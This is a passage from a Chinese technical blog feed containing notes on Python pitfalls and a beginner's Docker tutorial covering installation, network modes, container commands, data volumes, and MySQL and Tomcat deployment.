class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0.1</span> + <span class="hljs-number">0.1</span> + <span class="hljs-number">0.1</span><br><span class="hljs-number">0.30000000000000004</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0.3</span> == (<span class="hljs-number">0.1</span> + <span class="hljs-number">0.1</span> + <span class="hljs-number">0.1</span>)<br><span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>　　这个和正确结果存在细微差异的奇怪的结果是计算机表示和处理浮点数的方式存在舍入误差造成的。这不是Python的问题，而是IEEE 754标准的问题，它是一个在CPU浮点电路中实现的硬件标准，而非某种语言的软件标准。使用C++或JavaScript，甚至所有在使用IEEE 754标准的CPU上运行的语言（实际上世界上所有的CPU都遵循这一标准），都会得到相同的结果。</p><p>果需要做到准确，例如进行科学计算或者金融计算，那么可以使用Python内置的<code>decimal</code>模块。尽管十进制对象的计算速度比较慢，但好处是能够精确地替代浮点值。比如<code>decimal.Decimal(&#39;0.1&#39;)</code>可以创建一个精确表示数字0.1的值，不会存在浮点数的舍入错误。</p><h2 id="8-7-不要使用链式-运算符"><a href="#8-7-不要使用链式-运算符" class="headerlink" title="8.7　不要使用链式!=运算符"></a>8.7　不要使用链式<code>!=</code>运算符</h2><p>链式比较运算符，如<code>18 &lt; age &lt; 35</code>，或链式赋值运算符，比如<code>six = halfDozen = 6</code>，分别是<code>(18 &lt; age) and (age &lt; 35)</code>以及<code>six = 6; halfDozen = 6</code>的简写。</p><p>　　但不要使用链式比较运算符<code>!=</code>。你也许以为下面这段代码是在检查3个变量是否有不同的值，因为它的结果为<code>True</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a = <span class="hljs-string">&#x27;cat&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>b = <span class="hljs-string">&#x27;dog&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>c = <span class="hljs-string">&#x27;moose&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a != b != c<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>　　但实际上，它相当于<code>(a != b) and (b != c)</code>，这意味着即使<code>a</code>等于<code>c</code>，表达式<code>a != b != c</code>的结果仍然为<code>True</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a = <span class="hljs-string">&#x27;cat&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>b = <span class="hljs-string">&#x27;dog&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>c = <span class="hljs-string">&#x27;cat&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a != b != c<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>　　这个错误很难排查，代码也很误导人，所以最好彻底避免使用链式<code>!=</code>运算符。</p><h2 id="8-8-不要忘记在仅有一项的元组中添加逗号"><a href="#8-8-不要忘记在仅有一项的元组中添加逗号" class="headerlink" title="8.8　不要忘记在仅有一项的元组中添加逗号"></a>8.8　不要忘记在仅有一项的元组中添加逗号</h2><p>在代码中写元组字面量时要记住，务必为仅有一项的元组添加拖尾逗号。<code>(42,)</code>是一个包含整数42的元组，而<code>(42)</code>只是整数42。<code>(42)</code>中的括号类似于表达式<code>(20 + 1) * 2</code>中的括号，是一个添加了括号的表达式，它的值为整数42。</p><h1 id="九-Python的奇特难懂之处"><a href="#九-Python的奇特难懂之处" class="headerlink" title="九　Python的奇特难懂之处"></a>九　Python的奇特难懂之处</h1><h2 id="9-1-为什么256是256，而257不是257"><a href="#9-1-为什么256是256，而257不是257" class="headerlink" title="9.1　为什么256是256，而257不是257"></a>9.1　为什么256是256，而257不是257</h2><p>　　<code>==</code>运算符比较两个对象的值是否相等，<code>is</code>运算符则比较它们的身份是否相同。尽管整数<code>42</code>和浮点数<code>42.0</code>的值是相等的，但它们是不同的对象，保存在计算机内存的不同位置。通过<code>id()</code>函数检查它们的ID是否相同可以确认这一点：</p><p>当然，现实中的程序一般只会用到整数的值，不会在乎它的身份，根本不会使用<code>is</code>运算符比较整数、浮点数、字符串、布尔型或者其他简单数据类型的值。有个例外：当判断<code>None</code>时要使用<code>is None</code>而非<code>== None</code>，正如6.4.3节所提到的。除此之外，你几乎不会遇到这个问题。</p><h2 id="9-4-传递空列表给all"><a href="#9-4-传递空列表给all" class="headerlink" title="9.4　传递空列表给all()"></a>9.4　传递空列表给<code>all()</code></h2><p>内置函数<code>all()</code>接受一个序列值，比如列表。如果该序列中的所有值都是真值，则返回<code>True</code>，如果其中存在假值，则返回<code>False</code>。可以认为<code>all([False，True，True])</code>等效于表达式<code>False and True and True</code>。</p><p>　　你可以将<code>all()</code>和列表推导式结合起来使用。首先基于列表创建一个布尔值的列表，然后使用<code>all()</code>计算。比如，在交互式shell中输入以下内容：</p><p>最好把<code>all([])</code>看作在计算“这个列表中不存在假值”，而不是“这个列表中都是真值”，否则会得到一些奇怪的结果。在交互式shell中输入以下内容：</p><h2 id="9-5-布尔值是整数值"><a href="#9-5-布尔值是整数值" class="headerlink" title="9.5　布尔值是整数值"></a>9.5　布尔值是整数值</h2><p>Python认为浮点数42.0等于整数值42，同时也认为布尔值<code>True</code>和<code>False</code>分别等于1和0。在Python中，<code>bool</code>数据类型是<code>int</code>数据类型的一个子类（第16章将讨论类和子类）。你可以使用<code>int()</code>将布尔值转换为整数：</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【other】docker相关基础介绍</title>
    <link href="/2024/01/08/908docker%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/"/>
    <url>/2024/01/08/908docker%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="一、docker基础介绍"><a href="#一、docker基础介绍" class="headerlink" title="一、docker基础介绍"></a>一、docker基础介绍</h1><h2 id="1-1-docker-是什么？"><a href="#1-1-docker-是什么？" class="headerlink" title="1.1 docker 是什么？"></a>1.1 docker 是什么？</h2><ul><li>docker 是一个开源的应用容器<code>引擎</code></li><li>docker 诞生于2013年，基于Go语言实现，</li><li>docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，现在也支持Windows 和 Mac OS</li><li>容器是完全使用沙箱机制，相互隔离</li><li>容器性能开销极低</li></ul><h3 id="1-2-docker-安装"><a href="#1-2-docker-安装" class="headerlink" title="1.2 docker 安装"></a>1.2 docker 安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. 先卸载旧版本的docke<br>sudo apt-get remove docker docker-engine docker.io<br>2. 更新一下apt-get源<br>sudo apt-get update<br>3. 安装GPG证书<br><span class="hljs-meta prompt_">#</span><span class="language-bash">别忘了最后的“-”</span><br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br>4. 写入软件源信息<br>sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;<br>5. 列出可用版本<br>sudo apt-cache madison docker-ce<br>6. 更新并安装 Docker-CE<br>sudo apt-get update<br>sudo apt-get install docker-ce=5:23.0.5-1~ubuntu.20.04~focal<br>sudo apt-get install docker-ce=5:24.0.9-1~ubuntu.22.04~jammy<br>7. 开启docker服务，查看docker状态<br>sudo service docker start<br>sudo service docker status<br>systemctl restart docker<br>8.使用docker的命令，查看现有镜像和正在运行的容器<br>docker images<br>docker ps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">docker compose安装</span><br>curl -L &quot;https://github.com/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose<br><br>sudo apt-get update<br>sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br>sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;<br><br><br>sudo apt-get update<br>sudo apt-get install docker-ce docker-ce-cli containerd.io<br><br>docker -v<br></code></pre></td></tr></table></figure><p>2、换源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost henryhzy]# vim /etc/docker/daemon.json  # 创建或修改 /etc/docker/daemon.json 文件，修改为如下形式<br>&#123;<br>    &quot;registry-mirrors&quot; : [<br>    &quot;https://docker.mirrors.ustc.edu.cn&quot;,<br>    &quot;http://hub-mirror.c.163.com&quot;,<br>    &quot;https://cr.console.aliyun.com/&quot;<br>  ]<br>&#125;<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl daemon-reload</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl restart docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker info</span><br></code></pre></td></tr></table></figure><h3 id="1-3-Docker-架构"><a href="#1-3-Docker-架构" class="headerlink" title="1.3 Docker 架构"></a>1.3 Docker 架构</h3><ul><li>镜像（Image）：Docker镜像（Image），就相当于是一个root文件系统。比如官方镜像 ubuntu:16.04就包含了完整的一套Ubuntu16.04最小系统的root文件系统</li><li>容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等</li><li>仓库（Repository）：仓库可以看成一个代码控制中心，用来保存镜像</li></ul><p>拉取镜像下来，相当于拉了这个系统，然后启动容器，就是运行这个镜像，一个镜像可以启动多个容器，容器必须要基与镜像去启动。</p><p>仓库，就比如说docker官方仓库，你也可以私人新建一个仓库。</p><h3 id="1-4-docker-内的网络通信，四种网络模式"><a href="#1-4-docker-内的网络通信，四种网络模式" class="headerlink" title="1.4 docker 内的网络通信，四种网络模式"></a>1.4 docker 内的网络通信，四种网络模式</h3><table><thead><tr><th align="left">Docker 网络模式</th><th>配置</th><th>说明</th></tr></thead><tbody><tr><td align="left">host 模式</td><td>-net&#x3D;host</td><td>主机网络模式，容器和书主机共享Network name</td></tr><tr><td align="left">container模式</td><td>-net&#x3D;container&#x3D;NAME_or_ID</td><td>容器网络模式，容器和另外一个容器共享Network namespace。kubernetes中pod就是多个容器共享一个Network namespace。</td></tr><tr><td align="left">none 模式</td><td>-net&#x3D;none</td><td>容器有独立的Network namespace,但病灭有对齐进行任何网络设置，如分配vetn pair和网桥链接 ip等</td></tr><tr><td align="left">bridge 模式 （桥）默认</td><td>-net&#x3D;bridge</td><td>桥接网络模式 这个是默认模式，</td></tr></tbody></table><ol><li><p>桥接网络模式（Bridge Network Mode）：—-<code>比较通用比较常规的方式，默认使用</code></p><ul><li>默认情况下，Docker容器使用桥接网络模式。</li><li>在桥接网络模式下，Docker守护进程会为每个容器创建一个虚拟网桥，并将容器连接到该网桥上。</li><li>容器可以通过桥接网络相互通信，也可以与宿主机进行通信。</li><li>桥接网络模式<strong>适用于多个容器需要在相同的网络中进行通信的场景</strong>，<strong>比如应用程序的分布式部署</strong>。</li></ul></li><li><p>主机网络模式（Host Network Mode）：—-<code>与主机同网，性能高</code></p><ul><li>在主机网络模式下，<strong>容器与宿主机共享相同的网络命名空间</strong>，容器直接使用宿主机的网络栈。</li><li><strong>容器与宿主机之间没有网络隔离</strong>，容器的网络操作与宿主机一致。</li><li>主机网络模式<strong>适用于对网络性能要求较高的场景</strong>，比如<strong>需要容器与宿主机共享网络端口</strong>或者<strong>需要最大化网络吞吐量</strong>的应用。</li></ul></li><li><p>容器网络模式（<strong>Container</strong> Network Mode）：—–<code>更适合适合容器之间通讯</code></p><ul><li>在容器网络模式下，<strong>多个容器可以共享同一个网络栈</strong>。</li><li><strong>容器可以通过容器名称进行通信</strong>，而无需使用IP地址。</li><li><strong>容器网络模式适用于需要在多个容器之间建立专用网络的场景</strong>，<strong>比如多个应用容器需要与数据库容器进行通信。</strong></li></ul></li><li><p>无网络模式（None Network Mode）：</p><ul><li>在无网络模式下，容器没有任何网络连接。</li><li>容器无法通过网络访问外部系统，也无法从外部系统访问容器。</li><li>无网络模式适用于对网络完全隔离的场景，比如安全性要求高的容器环境。</li></ul></li></ol><p>这些网络模式提供了不同的网络配置选项，可以根据具体的应用需求选择合适的网络模式。通过适当选择网络模式，可以满足容器之间的通信需求，提供网络隔离和安全性，并优化网络性能。</p><h1 id="二、Docker-命令"><a href="#二、Docker-命令" class="headerlink" title="二、Docker  命令"></a>二、Docker  命令</h1><h3 id="2-1-Docker-服务相关命令"><a href="#2-1-Docker-服务相关命令" class="headerlink" title="2.1 Docker 服务相关命令"></a>2.1 Docker 服务相关命令</h3><ul><li><p>启动docker 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start docker<br></code></pre></td></tr></table></figure></li><li><p>停止docker 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl stop docker<br></code></pre></td></tr></table></figure></li><li><p>重启docker 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl restart docker<br></code></pre></td></tr></table></figure></li><li><p>查看docker 服务状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl status docker<br></code></pre></td></tr></table></figure></li><li><p>设置开机启动docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl enable docker<br></code></pre></td></tr></table></figure></li><li><p>其他docker 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker version<br>docker info<br>docker --help<br>docker pull --help<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-2-Docker-镜像相关命令"><a href="#2-2-Docker-镜像相关命令" class="headerlink" title="2.2 Docker 镜像相关命令"></a>2.2 Docker 镜像相关命令</h3><ul><li><p>查看镜像：查看本地所有的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker images<br>docker images -q #查看所有镜像的id<br></code></pre></td></tr></table></figure></li><li><p>搜索镜像：从网络中查找需要的镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search 镜像名称<br></code></pre></td></tr></table></figure></li><li><p>拉取镜像：从Docker 仓库下载镜像到本地，镜像名称格式为<code>名称:版本号</code>，如果版本号不指定则是最新的版本。如果不知道镜像版本，可以去docker hub 搜索对应镜像查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull 镜像名称<br></code></pre></td></tr></table></figure></li><li><p>删除镜像：删除本地镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rmi 镜像id/名称号:版本号 #删除指定本地镜像<br>docker rmi &#x27;docker images -q&#x27; #删除所有本地镜像<br></code></pre></td></tr></table></figure></li><li><p>保存镜像：将我们的镜像 保存为tar 压缩文件 这样方便镜像转移和保存 ,然后 可以在任何一台安装了docker的服务器上 加载这个镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker save 镜像名/镜像ID -o 镜像保存在哪个位置与名字<br>docker save tomcat -o /myimg.tar<br><span class="hljs-meta prompt_"># </span><span class="language-bash">加载镜像</span><br>docker load -i 镜像保存文件位置<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-3-Docker-容器相关命令"><a href="#2-3-Docker-容器相关命令" class="headerlink" title="2.3 Docker 容器相关命令"></a>2.3 Docker 容器相关命令</h3><ul><li><p>查看容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker ps #查看正在运行的容器<br>docker ps -a #查看所有容器<br></code></pre></td></tr></table></figure></li><li><p>创建并启动容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run 参数 版本:版本号 &lt;/bin/bash&gt;#默认为/bin/bash<br></code></pre></td></tr></table></figure><ul><li><p>参数说明：</p><ul><li><code>-i</code>：保持容器运行。通常与<code>-t</code>同时使用。加入<code>it</code>这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭</li><li><code>-t</code>：为容器重新分配一个伪输入终端，通常与<code>-i</code>同时使用</li><li><code>-d</code>：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用<code>docker exec</code>进入容器<code>docker exec -it c2 /bin/bash</code>。退出后，容器不会关闭</li><li><code>-it</code>创建的容器一般称为交互式容器；<code>-id</code>创建的容器一般称为守护式容器</li><li><code>--name</code>：为创建的容器命名</li></ul></li></ul></li><li><p>进入容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec 参数 #退出容器，容器不会关闭<br>docker exec -it &lt;容器名称或 ID&gt; /bin/bash<br></code></pre></td></tr></table></figure></li><li><p>停止容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop 容器名称 <br></code></pre></td></tr></table></figure></li><li><p>启动容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker start 容器名称<br></code></pre></td></tr></table></figure></li><li><p>删除容器：如果容器是运行状态则删除失败，需要停止容器参能删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rm 容器名称<br></code></pre></td></tr></table></figure></li><li><p>查看容器信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker inspect 容器名称<br></code></pre></td></tr></table></figure></li><li><p><strong>查看容器日志</strong>-这个很有用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs 容器名称<br></code></pre></td></tr></table></figure></li></ul><h1 id="三、-Docker-容器的数据卷"><a href="#三、-Docker-容器的数据卷" class="headerlink" title="三、 Docker 容器的数据卷"></a>三、 Docker 容器的数据卷</h1><h3 id="3-1-数据卷概念及作用"><a href="#3-1-数据卷概念及作用" class="headerlink" title="3.1 数据卷概念及作用"></a>3.1 数据卷概念及作用</h3><p><strong>试着想一下：</strong></p><ul><li>Docker 容器删除后，在容器中产生的数据还在吗？—是持久化的存储吗？</li><li>Docker 容器和外部机器可以交换文件吗？  ——–容器与外部通讯 ？</li><li>容器之间想要进行数据交互？————容器与容器之间通讯 ？</li></ul><p><strong>这里就有一个<code>数据卷</code>的概念了：</strong></p><ul><li>数据卷是宿主机（运行的物理设备）中的一个目录或文件</li><li>当容器目录和数据卷目录绑定后，对方的修改会立即同步——绑定本机对应目录</li><li>一个数据卷可以被多个容器同时挂载———一个目录映射多个容器</li><li>一个容器也可以被挂载多个数据卷———-一个容器映射多个目录</li></ul><p><strong>数据卷的作用就出来了：</strong></p><ul><li>容器数据持久化</li><li>外部计价器和容器间接通信</li><li>容器之间数据交换</li></ul><h3 id="3-2-配置数据卷"><a href="#3-2-配置数据卷" class="headerlink" title="3.2 配置数据卷"></a>3.2 配置数据卷</h3><ul><li><p>创建启动容器时，使用<code>-v</code>参数 设置数据卷</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run ... -v 宿主机目录(文件):容器内目录(文件) ...<br></code></pre></td></tr></table></figure><ul><li>-v 就是 -Volumes 卷的意思</li></ul></li><li><p>注意事项：</p><ol><li>目录必须是绝对路径—-&#x2F;home&#x2F;user&#x2F;user1&#x2F;docker&#x2F;mysql</li><li>如果目录不存在，会自动创建</li><li>可以挂载多个数据卷</li></ol></li></ul><h3 id="3-3-配置数据卷容器"><a href="#3-3-配置数据卷容器" class="headerlink" title="3.3 配置数据卷容器"></a>3.3 配置数据卷容器</h3><p>​    多容器进行数据交换：</p><ol><li>多个容器挂载同一个数据卷</li><li>数据卷容器</li></ol><p>​    <strong>配置数据卷容器：</strong></p><ol><li><p>创建启动c3数据卷容器，使用<code>-v</code>参数 设置数据卷</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --name=c3 -v /volume centos:7 /bin/bash<br></code></pre></td></tr></table></figure></li><li><p>创建启动c1 c2容器，使用<code>--volumes-from</code>参数 设置数据卷</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --name=c1 --volumes-from c3 centos:7 /bin/bash<br>docker run -it --name=c2 --volumes-from c3 centos:7 /bin/bash<br></code></pre></td></tr></table></figure></li></ol><h1 id="四、Docker-应用部署"><a href="#四、Docker-应用部署" class="headerlink" title="四、Docker 应用部署"></a>四、Docker 应用部署</h1><h2 id="4-1-MySQL部署"><a href="#4-1-MySQL部署" class="headerlink" title="4.1 MySQL部署"></a>4.1 MySQL部署</h2><h5 id="4-1-1案例：需求"><a href="#4-1-1案例：需求" class="headerlink" title="4.1.1案例：需求"></a>4.1.1案例：需求</h5><ul><li>在Docker 容器中部署MySQL，并通过外部MySQL 客户端操作MySQL Server</li></ul><h5 id="4-1-2-案例：实现"><a href="#4-1-2-案例：实现" class="headerlink" title="4.1.2 案例：实现"></a>4.1.2 案例：实现</h5><ol><li>搜索mysql镜像</li><li>拉取mysql镜像</li><li>创建容器</li><li>操作容器中的mysql</li></ol><h5 id="4-1-3-问题及解决方案"><a href="#4-1-3-问题及解决方案" class="headerlink" title="4.1.3 问题及解决方案"></a>4.1.3 问题及解决方案</h5><ul><li>容器内的网络服务和外部机器不能直接通信</li><li>外部机器和宿主机可以直接通信</li><li>宿主机和容器可以直接通信</li><li>当容器中的网络服务需要被外部机器访问时，可以将容器中提供服务的端口映射到宿主机的端口上。外部机器访问宿主机的端口，从而间接访问容器的服务</li><li>这种操作称为：端口映射</li></ul><h5 id="4-1-4-部署MySQL"><a href="#4-1-4-部署MySQL" class="headerlink" title="4.1.4 部署MySQL"></a>4.1.4 部署MySQL</h5><ol><li><p>搜索mysql镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search mysql<br></code></pre></td></tr></table></figure></li><li><p>拉取mysql镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull mysql:5.6<br></code></pre></td></tr></table></figure></li><li><p>创建容器，设置端口映射、目录映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在/root目录下创建mysql目录用于存储mysql数据信息</span><br>mkdir ~/mysql<br>cd ~/mysql<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id \<br>-p 3306:3306 \<br>--name=c_mysql \<br>-v $PWD/conf:/etc/mysql/conf.d \<br>-v $PWD/logs:/logs \<br>-v $PWD/data:/var/lib/mysql \<br>-e MYSQL_ROOT_PASSWORD=123456 \<br>mysql:latest<br></code></pre></td></tr></table></figure><ul><li>参数说明<ul><li><code>-p 3307:3306</code>：将容器的3306端口映射到宿主机的3307端口</li><li><code>--v $PWD/conf:/etc/mysql/conf.d</code>：将主机当前目录下的<code>conf/my.cnf</code>挂载到容器<code>/etc/mysql/my.cnf</code>配置目录</li><li><code>-v $PWD/logs:/logs</code>：将主机当前目录下的<code>logs</code>目录挂载到容器的<code>/logs</code>目录日志</li><li><code>-v $PWD/data:/var/lib/mysql</code>：将主机当前目录下的<code>data</code>目录挂载到容器的<code>/var/lib/mysql</code>数据目录</li><li><code>-e MYSQL_ROOT_PASSWORD=123456</code>：初始化root 用户密码</li></ul></li></ul></li><li><p>使用外部机器访问MySQL</p></li><li><p>进入mysql容器创建数据库</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it 容器id:cecb37dc3872 /bin/bash<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入mysql</span><br>root@cecb37dc3872:/# mysql -u root -p<br><span class="hljs-meta prompt_">#</span><span class="language-bash">输入密码后进入了</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">CREATE DATABASE kinit; <span class="hljs-comment"># # 创建数据库</span></span><br>Query OK, 1 row affected (0.00 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果你想为 <span class="hljs-string">&quot;kinit&quot;</span> 数据库设置一个默认字符集和排序规则，你可以使用以下命令：</span><br>CREATE DATABASE kinit CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;# 这将创建一个使用 UTF-8 编码的数据库，并使用适当的排序规则<br><span class="hljs-meta prompt_"># </span><span class="language-bash">确认数据库是否成功创建，你可以使用以下命令列出所有数据库：</span><br>CREATE DATABASE commonsyncer CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci<br>SHOW DATABASES;<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">SHOW DATABASES;</span><br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| kinit              |<br>| mysql              |<br>| performance_schema |<br>+--------------------+<br>4 rows in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><h3 id="4-2-Tomcat部署"><a href="#4-2-Tomcat部署" class="headerlink" title="4.2 Tomcat部署"></a>4.2 Tomcat部署</h3><ol><li><p>搜索Tomcat 镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search tomcat<br></code></pre></td></tr></table></figure></li><li><p>拉取mysql镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull tomcat<br></code></pre></td></tr></table></figure></li><li><p>创建容器，设置端口映射、目录映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在/root目录下创建tomcat目录用于存放tomcat数据信息</span><br>mkdir ~/tomcat<br>cd ~/tomcat<br></code></pre></td></tr></table></figure><figure class="highlight 